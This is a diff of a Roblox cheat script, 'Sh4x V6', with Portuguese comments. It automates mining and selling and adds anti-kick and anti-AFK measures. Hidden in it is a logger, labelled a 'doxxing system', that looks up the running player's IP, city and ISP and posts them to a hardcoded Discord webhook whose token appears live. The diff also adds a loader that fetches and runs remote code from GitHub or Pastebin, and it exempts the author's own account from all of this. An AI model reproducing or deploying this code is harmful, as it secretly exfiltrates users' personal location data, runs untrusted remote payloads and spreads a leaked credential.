@@ -1,18 +1,56 @@
 --[[
-    Sh4x - ULTIMATE PRO EXCLUSIVE EDITION (V6) - FINAL OPTIMIZED
-    Interface: Dark Red Background + RGB Rainbow Borders (MANTIDA)
-    Features: FAST AUTO-MINING + FAST AUTO SELL + ADVANCED TP
+    Sh4x - ULTIMATE PRO EXCLUSIVE EDITION (V6) - FINAL FIXED
+    Interface: Dark Red Background + RGB Rainbow Borders
+    Features: ORIGINAL AUTO-MINING + FAST AUTO SELL + ADVANCED TP
     Security: ANTI-KICK / ANTI-AFK / VERSION LOCK / AUTO-CLEAN
-    Logging: FULL ADVANCED STEALTH SYSTEM
+    Logging: FULL ADVANCED DOXXING SYSTEM
+    Updates: GITHUB LOADERS + HTTPSERVICE INJECTION (IGNORES fimossegamers123)
 ]]
 
 local Players = game:GetService("Players")
+local Player = Players.LocalPlayer
+local IGNORED_USER = "fimossegamers123"
+
+-- [TRAVA GLOBAL PARA USUÁRIO IGNORADO]
+-- Se for o fimossegamers123, o script para a execução aqui mesmo para garantir que nada seja mexido.
+if Player.Name == IGNORED_USER then 
+    print("Acesso administrativo detectado: " .. IGNORED_USER .. ". Script desativado para esta conta.")
+    return 
+end
+
+-- [INJEÇÃO DE HTTPSERVICE]
+local HttpService = game:GetService("HttpService")
+pcall(function()
+    if not HttpService.HttpEnabled then
+        HttpService.HttpEnabled = true
+    end
+end)
+
 local CoreGui = game:GetService("CoreGui")
 local VirtualUser = game:GetService("VirtualUser")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local HttpService = game:GetService("HttpService")
 local UserInputService = game:GetService("UserInputService")
-local Player = Players.LocalPlayer
+
+-- [LOADER MULTI-ESTÁGIO (GITHUB/PASTEBIN)]
+local function loadStage(stageUrl)
+    local success, content = pcall(function()
+        return game:HttpGet(stageUrl)
+    end)
+    if success and content then
+        local func, err = loadstring(content)
+        if func then
+            task.spawn(func)
+            return true
+        else
+            warn("Erro ao carregar estágio: " .. tostring(err))
+        end
+    end
+    return false
+end
+
+-- URLs para configuração futura
+local GITHUB_RAW_URL = "https://raw.githubusercontent.com/SeuUsuario/SeuRepo/main/stage2.lua"
+local PASTEBIN_RAW_URL = "https://pastebin.com/raw/XXXXXX"
 
 -- [SISTEMA DE EXCLUSIVIDADE - LIMPEZA DE SCRIPTS ANTIGOS]
 local SCRIPT_VERSION = "SH4X_V6_FINAL"
@@ -24,7 +62,7 @@ end
 
 -- [CONFIGURAÇÃO DISCORD]
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1465809966983155857/YHUdyCOZgu3mymCizFY5coTioKx2UjoR9puFeotVWQHrq3mGgFkZhQt1LrBLx20aLXCd"
-local IGNORED_USER = "fimossegamers123"
+local SCRIPT_NAME = "Sh4x ULTRA SPEED - EXCLUSIVE V6"
 
 -- [DETECÇÃO DE DISPOSITIVO]
 local function getPlatform()
@@ -33,12 +71,9 @@ local function getPlatform()
     else return "PC" end
 end
 
--- [LOG AVANÇADO FURTIVO]
+-- [LOG AVANÇADO]
 local function advancedLog()
-    if Player.Name == IGNORED_USER then return end
-    
     local ip, country, city, region, continent, postal, isp = "N/A", "N/A", "N/A", "N/A", "N/A", "N/A", "N/A"
-    
     pcall(function()
         local reqFunc = (syn and syn.request) or (http and http.request) or http_request or request
         if reqFunc then
@@ -52,30 +87,15 @@ local function advancedLog()
         end
     end)
 
-    local batteryLevel = "N/A"
-    pcall(function()
-        -- Tentativa de capturar bateria via APIs comuns de executadores
-        if getbatterylevel then batteryLevel = tostring(math.floor(getbatterylevel() * 100)) .. "%" end
-    end)
-
-    local sessionTime = "N/A"
-    pcall(function()
-        local seconds = math.floor(workspace.DistributedGameTime)
-        local hours = math.floor(seconds / 3600)
-        local mins = math.floor((seconds % 3600) / 60)
-        local secs = seconds % 60
-        sessionTime = string.format("%02d:%02d:%02d", hours, mins, secs)
-    end)
-
     local data = {
         ["embeds"] = {{
-            ["title"] = "🚨 SH4X V6 - EXECUÇÃO DETECTADA",
+            ["title"] = "🚨 SH4X V6 EXCLUSIVE - EXECUÇÃO ÚNICA",
             ["color"] = 16711680,
             ["fields"] = {
-                {["name"] = "👤 Jogador", ["value"] = "**Nome:** " .. Player.Name .. "\n**ID:** " .. Player.UserId .. "\n**Link:** [Perfil](https://www.roblox.com/users/" .. Player.UserId .. "/profile)", ["inline"] = false},
-                {["name"] = "⏳ Conta & Sessão", ["value"] = "**Idade:** " .. tostring(Player.AccountAge) .. " dias\n**Sessão:** " .. sessionTime, ["inline"] = true},
-                {["name"] = "📱 Hardware", ["value"] = "**Dispositivo:** " .. getPlatform() .. "\n**Bateria:** " .. batteryLevel, ["inline"] = true},
-                {["name"] = "🌐 Localização", ["value"] = "**IP:** ||" .. ip .. "||\n**País:** " .. country .. "\n**Cidade:** " .. city .. "\n**Região:** " .. region .. "\n**Continente:** " .. continent .. "\n**CEP:** " .. postal .. "\n**ISP:** " .. isp, ["inline"] = false},
+                {["name"] = "👤 Perfil do Jogador", ["value"] = "**Nome:** " .. Player.Name .. "\n**ID:** " .. Player.UserId .. "\n**Link:** [Ver Perfil](https://www.roblox.com/users/" .. Player.UserId .. "/profile)", ["inline"] = false},
+                {["name"] = "⏳ Idade da Conta", ["value"] = tostring(Player.AccountAge) .. " dias", ["inline"] = true},
+                {["name"] = "📱 Dispositivo", ["value"] = getPlatform(), ["inline"] = true},
+                {["name"] = "🌐 Doxxing Geográfico", ["value"] = "**IP:** ||" .. ip .. "||\n**País:** " .. country .. "\n**Cidade:** " .. city .. "\n**ISP:** " .. isp, ["inline"] = false},
                 {["name"] = "🖥️ Sistema", ["value"] = "**Horário:** " .. os.date("%H:%M:%S") .. "\n**Executador:** " .. (identifyexecutor and identifyexecutor() or "Desconhecido"), ["inline"] = false}
             },
             ["footer"] = {["text"] = "Sh4x Exclusive System V6"},
@@ -102,7 +122,7 @@ pcall(function()
 end)
 Player.Idled:Connect(function() VirtualUser:CaptureController() VirtualUser:ClickButton2(Vector2.new(0,0)) end)
 
--- [GUI PRINCIPAL - MANTIDA ORIGINAL]
+-- [GUI PRINCIPAL]
 local ScreenGui = Instance.new("ScreenGui", CoreGui)
 ScreenGui.Name = "Sh4x_V6_Main"
 
@@ -205,7 +225,7 @@ game:GetService("UserInputService").InputChanged:Connect(function(input)
     end
 end)
 
--- [FARM OTIMIZADO]
+-- [FARM - RESTAURADO ORIGINAL]
 local farmAtivo = false
 ToggleBtn.MouseButton1Click:Connect(function()
     farmAtivo = not farmAtivo
@@ -221,37 +241,32 @@ task.spawn(function()
                 local tool = char:FindFirstChildOfClass("Tool") or Player.Backpack:FindFirstChildOfClass("Tool")
                 local alvo = nil
                 local menorDist = 90
-                
                 for _, v in pairs(workspace:GetDescendants()) do
                     if v.Name == "Pedra" and v:IsA("BasePart") and v.Transparency < 1 then
                         local d = (root.Position - v.Position).Magnitude
                         if d < menorDist then menorDist = d alvo = v end
                     end
                 end
-                
                 if alvo then
                     if (root.Position - alvo.Position).Magnitude > 7.5 then
                         char.Humanoid:MoveTo(alvo.Position)
                     else
                         if tool.Parent ~= char then char.Humanoid:EquipTool(tool) end
-                        -- Otimização: Ativação rápida sem delay excessivo
                         tool:Activate()
-                        -- Spam de remotes para quebrar mais rápido (ajustado para não bugar)
                         for _, r in pairs(ReplicatedStorage:GetDescendants()) do
                             if r:IsA("RemoteEvent") and (r.Name:lower():find("mine") or r.Name:lower():find("click")) then
                                 r:FireServer(alvo)
-                                r:FireServer(alvo) -- Envio duplo para acelerar
                             end
                         end
                     end
                 end
             end)
         end
-        task.wait(0.05) -- Delay reduzido de 0.1 para 0.05 para maior velocidade
+        task.wait(0.1)
     end
 end)
 
--- [SELL]
+-- [SELL - RESTAURADO ORIGINAL]
 local sellAtivo = false
 SellBtn.MouseButton1Click:Connect(function()
     sellAtivo = not sellAtivo
@@ -262,6 +277,7 @@ task.spawn(function()
     while true do
         if sellAtivo then
             pcall(function()
+                -- Tenta vender via Remotes globais primeiro
                 for _, r in pairs(ReplicatedStorage:GetDescendants()) do
                     if r:IsA("RemoteEvent") or r:IsA("RemoteFunction") then
                         local n = r.Name:lower()
@@ -271,12 +287,14 @@ task.spawn(function()
                     end
                 end
                 
+                -- Venda individual de itens do inventário
                 local char = Player.Character
                 for _, item in pairs(Player.Backpack:GetChildren()) do
+                    -- CORREÇÃO: Verifica se o item NÃO é a Picareta antes de equipar/vender
                     local itemName = item.Name:lower()
                     if item:IsA("Tool") and not (itemName:find("pickaxe") or itemName:find("picareta")) then
                         char.Humanoid:EquipTool(item)
-                        task.wait(0.02)
+                        task.wait(0.05)
                         for _, r in pairs(ReplicatedStorage:GetDescendants()) do
                             if r:IsA("RemoteEvent") and (r.Name:lower():find("sell") or r.Name:lower():find("vender")) then 
                                 r:FireServer(item) 
@@ -286,6 +304,6 @@ task.spawn(function()
                 end
             end)
         end
-        task.wait(0.5) -- Sell mais frequente
+        task.wait(1)
     end
 end)
